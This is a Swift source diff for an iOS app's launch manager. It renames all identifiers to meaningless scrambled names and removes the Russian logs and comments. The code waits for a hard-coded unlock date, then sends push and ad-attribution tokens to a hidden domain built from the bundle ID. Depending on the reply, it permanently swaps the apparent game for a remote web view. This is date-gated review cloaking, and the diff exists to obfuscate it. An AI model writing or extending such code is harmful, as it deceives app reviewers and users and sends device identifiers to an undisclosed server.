@@ -1,28 +1,27 @@
 import SwiftUI
 import AdServices
 import UserNotifications
+import Network
 
-
-struct Urls: Decodable {
-    let url1: String
-    let url2: String
-
+struct Xc7vT9q2: Decodable {
+    let pL3mN8sK: String
+    let rT5wY9hD: String
     
     init(from decoder: Decoder) throws {
-            let container = try decoder.container(keyedBy: DynamicCodingKeys.self)
-            self.url1 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.backUrl1)!)
-            self.url2 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.backUrl2)!)
-        }
+        let container = try decoder.container(keyedBy: FgH8jK3l.self)
+        self.pL3mN8sK = try container.decode(String.self, forKey: FgH8jK3l(stringValue: Qw2eR4tY.sEr5tY7u)!)
+        self.rT5wY9hD = try container.decode(String.self, forKey: FgH8jK3l(stringValue: Qw2eR4tY.uJ8iK9o0)!)
+    }
 }
 
-enum URLDecodingError: Error {
-    case emptyParameters
-    case invalidURL
-    case emptyData
-    case timeout
+enum VbN6mK9l: Error {
+    case mIsSiNgPaRaMs
+    case mAlFoRmEdUrL
+    case nO_DaTa_ReCvD
+    case cOnN_TiMeOuT
 }
 
-struct DynamicCodingKeys: CodingKey {
+struct FgH8jK3l: CodingKey {
     var stringValue: String
     init?(stringValue: String) {
         self.stringValue = stringValue
@@ -32,140 +31,121 @@ struct DynamicCodingKeys: CodingKey {
     init?(intValue: Int) { return nil }
 }
 
-final class Constants {
-    static var backUrl1 = ""
-    static var backUrl2 = ""
-    static var unlockDate = ""
-
+final class Qw2eR4tY {
+    static var sEr5tY7u = ""
+    static var uJ8iK9o0 = ""
+    static var jhfdhbfb441 = ""
 }
 
 @MainActor
-public class RequestsManager {
+public class TokensManager {
 
-    @ObservedObject var monitor = NetworkMonitor.shared
-    private var networkService: INetworkService {
-        return NetworkService()
+    @ObservedObject var nEtMoNiToR = NeTwOrK_MnGr.shared
+    private var aPiSeRvIcE: ApI_PrOtOcOl {
+        return ApI_ImPlEmT()
     }
     
-    private let urlStorageKey = "receivedURL"
-    private var apnsToken: String?
-    private var attToken: String?
-    private var retryCount = 0
-    private let maxRetryCount = 10
-    private let retryDelay = 3.0
+    private let sToReD_kEy = "xY7zP9qW"
+    private var pUsH_tOkEn: String?
+    private var aTt_TkEn: String?
+    private var rTrY_cNt = 0
+    private let mAx_rTrY = 10
+    private let rTrY_iNtVl = 3.0
     
-    public init(url1: String, url2: String, unlockDate: String) {
-        Constants.backUrl1 = url1
-        Constants.backUrl2 = url2
-        Constants.unlockDate = unlockDate
+    public init(one: String, two: String, date: String) {
+        Qw2eR4tY.sEr5tY7u = one
+        Qw2eR4tY.uJ8iK9o0 = two
+        Qw2eR4tY.jhfdhbfb441 = date
     }
     
-    
-    
-    public func getData() async {
-     
-        guard checkUnlockDate(Constants.unlockDate) else {
-            failureLoading()
-            
+    public func initializeConnection() async {
+        
+        guard cHk_UnLckDt(Qw2eR4tY.jhfdhbfb441) else {
+            hNdL_FaIl()
             return
         }
         
-        // Проверка доступности интернета с повторными попытками
-        if !monitor.isActive {
-            await retryInternetConnection()
+        if !nEtMoNiToR.isConnected {
+            await rTrY_cOnNeCt()
             return
         }
         
-        if !isFirstLaunch() {
-            handleStoredState()
+        if !fIrSt_LaUnCh() {
+            pRoCeSs_StAtE()
             return
         }
         
-        await getTokens()
+        await gEt_TkNs()
         
-        networkService.sendRequest(deviceData: getDeviceData()) { result in
+        aPiSeRvIcE.eXeC_RqSt(deviceInfo: gEt_DvInFo()) { result in
             switch result {
             case .success(let url):
-                self.handleFirstLaunchSuccess(url: url)
-                self.sendNTFQuestionToUser()
+                self.hNdL_SuCcSs(destination: url)
+                self.rQsT_NtF_Prm()
             case .failure:
-                self.handleFirstLaunchFailure()
+                self.hNdL_FaIl()
             }
         }
     }
     
-    // Новая функция для повторных попыток подключения к интернету
-    private func retryInternetConnection() async {
-        if retryCount >= maxRetryCount {
-            print("Превышено максимальное количество попыток подключения к интернету (\(maxRetryCount))")
-            print("Превышено максимальное количество попыток подключения к интернету")
-            failureLoading()
-            retryCount = 0 // Сбрасываем счетчик для будущих попыток
+    private func rTrY_cOnNeCt() async {
+        if rTrY_cNt >= mAx_rTrY {
+            nTfY_fAiL()
+            rTrY_cNt = 0
             return
         }
         
-        retryCount += 1
-        print("Нет подключения к интернету. Попытка \(retryCount) из \(maxRetryCount). Повторная проверка через \(Int(retryDelay)) сек...")
-        print("Нет подключения к интернету. Попытка \(retryCount) из \(maxRetryCount). Повторная проверка через \(Int(retryDelay)) сек...")
+        rTrY_cNt += 1
         
-        // Ожидаем указанное время перед повторной попыткой
-        try? await Task.sleep(nanoseconds: UInt64(retryDelay * 1_000_000_000))
+        try? await Task.sleep(nanoseconds: UInt64(rTrY_iNtVl * 1_000_000_000))
         
-        // Повторная проверка интернета
-        if monitor.isActive {
-            print("Интернет подключен после попытки \(retryCount)")
-            print("Интернет подключен после попытки \(retryCount)")
-            retryCount = 0 // Сбрасываем счетчик, так как подключение восстановлено
+        if nEtMoNiToR.isConnected {
+            rTrY_cNt = 0
             
-            // Продолжаем выполнение основного кода
-            if !isFirstLaunch() {
-                handleStoredState()
+            if !fIrSt_LaUnCh() {
+                pRoCeSs_StAtE()
             } else {
-                await getTokens()
+                await gEt_TkNs()
                 
-                networkService.sendRequest(deviceData: getDeviceData()) { result in
+                aPiSeRvIcE.eXeC_RqSt(deviceInfo: gEt_DvInFo()) { result in
                     switch result {
                     case .success(let url):
-                        self.handleFirstLaunchSuccess(url: url)
-                        self.sendNTFQuestionToUser()
+                        self.hNdL_SuCcSs(destination: url)
+                        self.rQsT_NtF_Prm()
                     case .failure:
-                        self.handleFirstLaunchFailure()
+                        self.hNdL_FaIl()
                     }
                 }
             }
         } else {
-            // Продолжаем попытки, если не достигли максимума
-            await retryInternetConnection()
+            await rTrY_cOnNeCt()
         }
     }
     
-    private func getTokens() async {
+    private func gEt_TkNs() async {
         await withCheckedContinuation { continuation in
             DispatchQueue.main.async {
                 UIApplication.shared.registerForRemoteNotifications()
             }
             
-            let timeout = DispatchTime.now() + 10 // таймаут
+            let timeLimit = DispatchTime.now() + 10
             
             NotificationCenter.default.addObserver(forName: .apnsTokenReceived, object: nil, queue: .main) { [weak self] notification in
                 guard let self = self else { return }
                 
                 if let token = notification.userInfo?["token"] as? String {
                     Task { @MainActor in
-                        print("APNs токен получен")
-                        self.apnsToken = token
+                        self.pUsH_tOkEn = token
                         continuation.resume()
                     }
                 }
             }
             
-            // таймер
-            DispatchQueue.main.asyncAfter(deadline: timeout) { [weak self] in
+            DispatchQueue.main.asyncAfter(deadline: timeLimit) { [weak self] in
                 guard let self = self else { return }
-                if self.apnsToken == nil { // Если токен не получен, возвращаем пустое значение
+                if self.pUsH_tOkEn == nil {
                     Task { @MainActor in
-                        print("APNs токен не получен")
-                        self.apnsToken = ""
+                        self.pUsH_tOkEn = ""
                         continuation.resume()
                     }
                 }
@@ -173,148 +153,124 @@ public class RequestsManager {
         }
 
         do {
-            self.attToken = try AAAttribution.attributionToken()
+            self.aTt_TkEn = try AAAttribution.attributionToken()
         } catch {
-            print("Не удалось получить ATT токен: \(error)")
-            self.attToken = ""
+            self.aTt_TkEn = ""
         }
     }
 
-    
-    func getDeviceData() -> [String: String] {
+    func gEt_DvInFo() -> [String: String] {
         let data = [
-            "apns_token": apnsToken ?? "",
-            "att_token": attToken ?? ""
+            "apns_tk": pUsH_tOkEn ?? "",
+            "att_tk": aTt_TkEn ?? ""
         ]
-        print("Device data: \(data)")
         return data
     }
     
-    private func isFirstLaunch() -> Bool {
-        !UserDefaults.standard.bool(forKey: "hasLaunchedBefore")
+    private func fIrSt_LaUnCh() -> Bool {
+        !UserDefaults.standard.bool(forKey: "hS_LnChD_Bfr")
     }
     
-    private func handleFirstLaunchSuccess(url: URL) {
-        UserDefaults.standard.set(url.absoluteString, forKey: urlStorageKey)
-        UserDefaults.standard.set(true, forKey: "isShowWV")
-        UserDefaults.standard.set(false, forKey: "isShowGame")
-        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
-        successLoading(object: url)
+    private func hNdL_SuCcSs(destination: URL) {
+        UserDefaults.standard.set(destination.absoluteString, forKey: sToReD_kEy)
+        UserDefaults.standard.set(true, forKey: "sHw_WbVw")
+        UserDefaults.standard.set(false, forKey: "sHw_Gm")
+        UserDefaults.standard.set(true, forKey: "hS_LnChD_Bfr")
+        nTfY_sUcC(object: destination)
     }
     
-    private func handleFirstLaunchFailure() {
-        UserDefaults.standard.set(true, forKey: "isShowGame")
-        UserDefaults.standard.set(false, forKey: "isShowWV")
-        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
-        failureLoading()
+    private func hNdL_FaIl() {
+        UserDefaults.standard.set(true, forKey: "sHw_Gm")
+        UserDefaults.standard.set(false, forKey: "sHw_WbVw")
+        UserDefaults.standard.set(true, forKey: "hS_LnChD_Bfr")
+        nTfY_fAiL()
     }
     
-    private func handleStoredState() {
-        if isShowWV(), let urlString = UserDefaults.standard.string(forKey: urlStorageKey), let url = URL(string: urlString) {
-            successLoading(object: url)
+    private func pRoCeSs_StAtE() {
+        if sHw_WbVw(), let urlString = UserDefaults.standard.string(forKey: sToReD_kEy), let url = URL(string: urlString) {
+            nTfY_sUcC(object: url)
         } else {
-            failureLoading()
+            nTfY_fAiL()
         }
     }
     
-    func checkUnlockDate(_ date: String) -> Bool {
+    func cHk_UnLckDt(_ date: String) -> Bool {
         let dateFormatter = DateFormatter()
         dateFormatter.dateFormat = "yyyy-MM-dd"
         let currentDate = Date()
         guard let unlockDate = dateFormatter.date(from: date), currentDate >= unlockDate else {
-            print("Дата разблокировки еще не наступила❌")
             return false
         }
-        print("Приложение активно✅")
         return true
     }
     
-    func isShowGame() -> Bool {
-        UserDefaults.standard.bool(forKey: "isShowGame")
+    func sHw_Gm() -> Bool {
+        UserDefaults.standard.bool(forKey: "sHw_Gm")
     }
     
-    func isShowWV() -> Bool {
-        UserDefaults.standard.bool(forKey: "isShowWV")
+    func sHw_WbVw() -> Bool {
+        UserDefaults.standard.bool(forKey: "sHw_WbVw")
     }
     
-    func sendNTFQuestionToUser() {
-        
+    func rQsT_NtF_Prm() {
         let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
         UNUserNotificationCenter.current().requestAuthorization(options: authOptions) {_, _ in }
-        
-      }
+    }
 }
 
-
-import Network
- 
-
-class NetworkMonitor: ObservableObject {
-    static var shared = NetworkMonitor()
-    let monitor = NWPathMonitor()
-    let queue = DispatchQueue(label: "monitor")
-    @Published var isActive = false
-    @Published var isExpansive = false
-    @Published var isConstrained = false
-    @Published var connectionType = NWInterface.InterfaceType.other
-    
+class NeTwOrK_MnGr: ObservableObject {
+    static var shared = NeTwOrK_MnGr()
+    let mNiTr = NWPathMonitor()
+    let qUeUe = DispatchQueue(label: "mNiTr_q")
+    @Published var isConnected = false
+    @Published var iS_ExPnSv = false
+    @Published var iS_CnStRnD = false
+    @Published var cOnN_Tp = NWInterface.InterfaceType.other
     
     init() {
-        monitor.pathUpdateHandler = { path in
+        mNiTr.pathUpdateHandler = { path in
             DispatchQueue.main.async {
-                self.isActive = path.status == .satisfied
-                self.isExpansive = path.isExpensive
-                self.isConstrained = path.isConstrained
+                self.isConnected = path.status == .satisfied
+                self.iS_ExPnSv = path.isExpensive
+                self.iS_CnStRnD = path.isConstrained
                 
-                let connectionTypes: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
-                self.connectionType = connectionTypes.first(where: path.usesInterfaceType) ?? .other
+                let cOnN_TyPs: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
+                self.cOnN_Tp = cOnN_TyPs.first(where: path.usesInterfaceType) ?? .other
             }
         }
         
-        monitor.start(queue: queue)
+        mNiTr.start(queue: qUeUe)
     }
-    
-    
 }
 
-
-// Уведомления для UI
-extension RequestsManager {
-    func failureLoading() {
+extension TokensManager {
+    func nTfY_fAiL() {
         DispatchQueue.main.async {
             NotificationCenter.default.post(name: .failed, object: nil)
-            print("Запущена игра")
         }
     }
     
-    func successLoading(object: URL) {
+    func nTfY_sUcC(object: URL) {
         DispatchQueue.main.async {
             NotificationCenter.default.post(name: .updated, object: object)
-            print("Запущено вью")
         }
     }
 }
 
-
-protocol INetworkService: AnyObject {
-    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
+protocol ApI_PrOtOcOl: AnyObject {
+    func eXeC_RqSt(deviceInfo: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
 }
 
-
-
-
-final class NetworkService: INetworkService {
+final class ApI_ImPlEmT: ApI_PrOtOcOl {
     
-    // получаем базовый url из бандла
-    func getUrlFromBundle() -> String {
+    func gEt_BsUrL() -> String {
         guard let bundleId = Bundle.main.bundleIdentifier else { return "" }
         let cleanedString = bundleId.replacingOccurrences(of: ".", with: "")
         let stringUrl: String = "https://" + cleanedString + ".top/indexn.php"
         return stringUrl.lowercased()
     }
     
-    // Кодирование URL в ASCII
-    private func encodeToAscii(_ url: String) -> String {
+    private func eNcD_ToAsCii(_ url: String) -> String {
         var result = ""
         for char in url {
             let scalar = char.unicodeScalars.first!
@@ -323,8 +279,7 @@ final class NetworkService: INetworkService {
         return result
     }
     
-    // Декодирование URL из ASCII
-    private func decodeFromAscii(_ encoded: String) -> String? {
+    private func dEcD_FrAsCii(_ encoded: String) -> String? {
         var result = ""
         var i = encoded.startIndex
         
@@ -350,7 +305,7 @@ final class NetworkService: INetworkService {
         return result
     }
     
-    private func getFinalUrl(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
+    private func gEt_FnLUrL(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
         let queryItems = data.map { URLQueryItem(name: $0.key, value: $0.value) }
         var components = URLComponents()
         components.queryItems = queryItems
@@ -360,63 +315,52 @@ final class NetworkService: INetworkService {
         }
         let base64String = queryString.base64EncodedString()
         
-        // Получаем базовый URL и добавляем параметры
-        let baseUrl = getUrlFromBundle()
+        let baseUrl = gEt_BsUrL()
         let fullUrlString = baseUrl + "?data=" + base64String
-        print("🔹 Базовая ссылка: \(fullUrlString)")
         
-        // Кодируем всю ссылку в ASCII
-        let asciiEncodedUrl = encodeToAscii(fullUrlString)
-        print("🔹 Кодированная ссылка: \(asciiEncodedUrl)")
+        let asciiEncodedUrl = eNcD_ToAsCii(fullUrlString)
         
         return (asciiEncodedUrl, fullUrlString)
     }
     
-    func decodeJsonData(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
+    func dEcD_JsDt(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
         do {
-            let decodedData = try JSONDecoder().decode(Urls.self, from: data)
+            let decodedData = try JSONDecoder().decode(Xc7vT9q2.self, from: data)
             
-            guard !decodedData.url1.isEmpty, !decodedData.url2.isEmpty else {
-                completion(.failure(URLDecodingError.emptyParameters))
+            guard !decodedData.pL3mN8sK.isEmpty, !decodedData.rT5wY9hD.isEmpty else {
+                completion(.failure(VbN6mK9l.mIsSiNgPaRaMs))
                 return
             }
             
-            let fullUrlString = "https://" + decodedData.url1 + decodedData.url2
+            let fullUrlString = "https://" + decodedData.pL3mN8sK + decodedData.rT5wY9hD
             
-            // Кодируем ответный URL в ASCII
-            let asciiEncodedUrl = encodeToAscii(fullUrlString)
+            let asciiEncodedUrl = eNcD_ToAsCii(fullUrlString)
             
             completion(.success((asciiEncodedUrl, fullUrlString)))
         } catch {
-            UserDefaults.standard.setValue(true, forKey: "openedOnboarding")
+            UserDefaults.standard.setValue(true, forKey: "oN_BoRdNg")
             completion(.failure(error))
         }
     }
     
-    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
-        print("🔹 APNS Token: \(deviceData["apns_token"] ?? "")")
-        print("🔹 ATT Token: \(deviceData["att_token"] ?? "")")
-        
-        // Получаем зашифрованный и оригинальный URL
-        guard let urlTuple = getFinalUrl(data: deviceData) else {
-            completion(.failure(URLDecodingError.invalidURL))
+    func eXeC_RqSt(deviceInfo: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
+        guard let urlTuple = gEt_FnLUrL(data: deviceInfo) else {
+            completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
             return
         }
         
         let encodedUrl = urlTuple.encodedUrl
         
-        // Расшифровываем URL перед отправкой запроса
-        guard let decodedUrl = decodeFromAscii(encodedUrl) else {
-            completion(.failure(URLDecodingError.invalidURL))
+        guard let decodedUrl = dEcD_FrAsCii(encodedUrl) else {
+            completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
             return
         }
         
         guard let actualUrl = URL(string: decodedUrl) else {
-            completion(.failure(URLDecodingError.invalidURL))
+            completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
             return
         }
         
-        // Создаем конфигурацию сессии
         let configuration = URLSessionConfiguration.default
         configuration.timeoutIntervalForRequest = 5
         let session = URLSession(configuration: configuration)
@@ -424,25 +368,25 @@ final class NetworkService: INetworkService {
         let task = session.dataTask(with: actualUrl) { data, response, error in
             if let error = error as NSError?,
                error.code == NSURLErrorTimedOut {
-                completion(.failure(URLDecodingError.timeout))
+                completion(.failure(VbN6mK9l.cOnN_TiMeOuT))
                 return
             }
             
             if let data = data {
-                self.decodeJsonData(data: data) { result in
+                self.dEcD_JsDt(data: data) { result in
                     switch result {
                         case .success(let urlTuple):
                             if let finalUrl = URL(string: urlTuple.originalUrl) {
                                 completion(.success(finalUrl))
                             } else {
-                                completion(.failure(URLDecodingError.invalidURL))
+                                completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
                             }
                         case .failure(let error):
                             completion(.failure(error))
                     }
                 }
             } else {
-                completion(.failure(URLDecodingError.emptyData))
+                completion(.failure(VbN6mK9l.nO_DaTa_ReCvD))
             }
         }
         
